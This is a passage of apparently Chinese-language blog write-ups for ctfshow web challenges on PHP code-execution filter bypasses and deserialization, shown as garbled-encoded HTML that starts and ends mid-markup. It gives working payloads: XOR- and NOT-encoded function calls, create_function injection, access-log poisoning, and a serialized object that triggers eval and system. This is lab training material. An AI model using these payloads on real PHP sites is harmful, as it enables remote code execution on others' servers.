class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-17 19:36:02</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>))&#123;</span><br><span class="line">        <span class="variable">$d</span> = (<span class="keyword">int</span>)(<span class="variable">$v1</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span> * <span class="number">0x36d</span>);</span><br><span class="line">        sleep(<span class="variable">$d</span>);</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¾ˆç®€å•ï¼Œç›´æ¥<br>v1=0ï¼Œå¦‚æœç­‰äº1ä½ å°†éœ€è¦ç­‰åˆ°0x36d * 0x36d * 0x36d * 0x36d * 0x36dè¿™ä¹ˆä¹…æ‰æœ‰å›æ˜¾</p><h2 id="web143"><a href="#web143" class="headerlink" title="web143"></a>web143</h2><p>æœ¬é¢˜ç”¨web141çš„å¼‚æˆ–è„šæœ¬å³å¯è§£å†³</p><h2 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h2><p>å’Œ141ä¸€æ ·ï¼Œä½†æ³¨æ„è¦çœ‹æ¸…v1v2v3çš„ä½ç½®ï¼ï¼ï¼</p><h2 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h2><p>æœ¬é¢˜æŠŠ*å’Œ-å’Œ+éƒ½è¿‡æ»¤äº†ï¼Œæ²¡æ€è·¯ï¼Œçœ‹å¤§ä½¬åšå®¢<br>å‘ç°é™¤äº†ä¸Šè¿°çš„ç¬¦å·è¿˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹çš„</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="number">1</span>&amp;v3=|(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">9</span>C%DF%<span class="number">99</span>%D5)|</span><br></pre></td></tr></table></figure><p>æˆ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="number">1</span>&amp;v3=?(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">9</span>C%DF%<span class="number">99</span>%D5):</span><br></pre></td></tr></table></figure><h2 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h2><p>ç¬¬äºŒä¸ªè¢«banï¼Œå› æ­¤ç”¨ä¸Šä¸€é¢˜çš„ç¬¬ä¸€ä¸ª</p><h2 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h2><p>æœ¬é¢˜åˆ©ç”¨create_functionå‡½æ•°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">create_function(<span class="string">&#x27;$a&#x27;</span>,<span class="string">&#x27;echo $a.&quot;123&quot;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ç±»ä¼¼äº</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;123&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¦‚æœæˆ‘ä»¬ç¬¬äºŒä¸ªå‚æ•°ä¼ å…¥ }phpinfo();//<br>å°±ç­‰ä»·äº</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"><span class="variable">$a</span></span>) </span>&#123;</span><br><span class="line">  &#125;phpinfo();<span class="comment">//</span></span><br><span class="line">&#125;</span><br><span class="line">ä»è€Œæ‰§è¡Œphpinfo()å‘½ä»¤</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¯¦ç»†å¯ä»¥çœ‹<a href="https://paper.seebug.org/755/">è¿™ç¯‡æ–‡ç« </a><br>åˆ™paylaod</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GETï¼š?show=&#125;system(<span class="string">&#x27;tac flag.php&#x27;</span>);<span class="comment">//</span></span><br><span class="line">POSTï¼šctf=\create_function</span><br></pre></td></tr></table></figure><h2 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h2><p>æ²¡æœ‰è¿‡æ»¤å¼‚æˆ–ï¼Œç›´æ¥å¼‚æˆ–</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(<span class="string">&quot;%08%02%08%09%05%0d&quot;</span>^<span class="string">&quot;%7b%7b%7b%7d%60%60&quot;</span>)(<span class="string">&quot;%09%01%03%01%06%02&quot;</span>^<span class="string">&quot;%7d%60%60%21%60%28&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h2><blockquote><p>scandirï¼ˆï¼‰ï¼šè¯»å–ï¼ˆï¼‰å†…è·¯å¾„ä¸‹çš„æ–‡ä»¶<br>unlinkï¼ˆï¼‰ï¼šåˆ é™¤æ–‡ä»¶</p></blockquote><p>ä¼ ğŸåˆ°index.phpæˆ–è¿›è¡Œæ¡ä»¶ç«äº‰</p><h2 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h2><p>ä»¤isvipä¸ºtrueä¹‹åç°åœ¨æ—¥å¿—ä¸­ä¼ å…¥ä¸€å¥è¯ï¼ˆå³åœ¨user-agentä¸­åŠ å…¥ï¼‰<br>ä¹‹åè®¿é—®æ—¥å¿—<br>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctf=/<span class="keyword">var</span>/log/nginx/access.log&amp;a=system(<span class="string">&quot;tac flag.php&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="web150plus"><a href="#web150plus" class="headerlink" title="web150plus"></a>web150plus</h2><p>çŸ¥è¯†ç‚¹</p><blockquote><p>_å¯ä»¥ç”¨..æ¥ä»£æ›¿<br>__autoloadï¼ˆï¼‰ï¼šè¿›è¡Œç±»åˆ¤æ–­æ—¶è¢«è°ƒç”¨</p></blockquote><p>åˆ™payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?..CTFSHOW..=phpinfo</span><br></pre></td></tr></table></figure><p>flagåœ¨phpinfoä¸­</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow webå…¥é—¨ ååºåˆ—åŒ–</title>
      <link href="/2022/01/07/ctfshow%20web%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2022/01/07/ctfshow%20web%E5%85%A5%E9%97%A8%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<p>@[TOC]</p><h2 id="é­”æœ¯å˜é‡"><a href="#é­”æœ¯å˜é‡" class="headerlink" title="é­”æœ¯å˜é‡"></a>é­”æœ¯å˜é‡</h2><p>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__sleep() <span class="comment">//åœ¨å¯¹è±¡è¢«åºåˆ—åŒ–ä¹‹å‰è¿è¡Œ</span></span><br><span class="line">__wakeup() <span class="comment">//å°†åœ¨ååºåˆ—åŒ–ä¹‹åç«‹å³è°ƒç”¨ï¼ˆå½“ååºåˆ—åŒ–æ—¶å˜é‡ä¸ªæ•°ä¸å®é™…ä¸ç¬¦æ˜¯ä¼šç»•è¿‡ï¼‰</span></span><br><span class="line">__construct() <span class="comment">//åœ¨ç±»å®ä¾‹åŒ–æ—¶ï¼Œä¼šè§¦å‘è¿›è¡Œåˆå§‹åŒ–</span></span><br><span class="line">__destruct() <span class="comment">//å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘</span></span><br><span class="line">__toString()ï¼š <span class="comment">//å½“ä¸€ä¸ªå¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span></span><br><span class="line">__call() <span class="comment">//åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line">__callStatic() <span class="comment">//åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘</span></span><br><span class="line">__get() <span class="comment">//è·å¾—ä¸€ä¸ªç±»çš„æˆå‘˜å˜é‡æ—¶è°ƒç”¨,ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®</span></span><br><span class="line">__set() <span class="comment">//ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§</span></span><br><span class="line">__isset() <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘</span></span><br><span class="line">__unset() <span class="comment">//åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘</span></span><br><span class="line">__toString() <span class="comment">//æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘</span></span><br><span class="line">__invoke() <span class="comment">//å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘</span></span><br></pre></td></tr></table></figure><h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Payload:</span><br><span class="line">?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure><h2 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h2><p>å°†isvipå˜ä¸ºtrue,å¹¶ä»cookieä¸­ä¼ å…¥ï¼Œè®°å¾—urlç¼–ç ï¼ï¼</p><h2 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h2><p>ï¼š<br>   ä¿è¯è¾“å…¥çš„usernameå’Œåºåˆ—åŒ–çš„ä¸€æ ·å¹¶ä¸”å’ŒåŸæ¥çš„passwordä¸ä¸€æ ·ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;a&#x27;</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> ctfShowUser);</span><br><span class="line">playload:</span><br><span class="line">?username=xxxxxx&amp;password=a</span><br></pre></td></tr></table></figure><p>web257</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 20:33:07</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»ä¸­å¯ä»¥çœ‹å‡ºéœ€è¦åˆ©ç”¨backDoorè¿™ä¸ªç±»ï¼›<br>å› æ­¤è¿›è¡Œä»¥ä¸‹çš„åºåˆ—åŒ–æ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;b&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;backDoor&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$code</span>=<span class="string">&#x27;system(&quot;tac flag.php&quot;);&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å°†å…¶æŠ“åŒ…æ”¾å…¥cookieä¸­æ”¾åŒ…ï¼ˆè®°å¾—è¦åŠ è·¯å¾„ï¼‰ã€‚</p><h2 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h2><p>åŒä¸Šç›¸å·®ä¸å¤§</p><h2 id="web258"><a href="#web258" class="headerlink" title="web258"></a>web258</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-02 17:44:47</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-02 21:38:56</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class=<span class="keyword">new</span> info();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="keyword">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;class-&gt;getInfo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;user;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getInfo</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;code);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/[oc]:\d+:/i&#x27;</span>, <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$user</span> = unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span 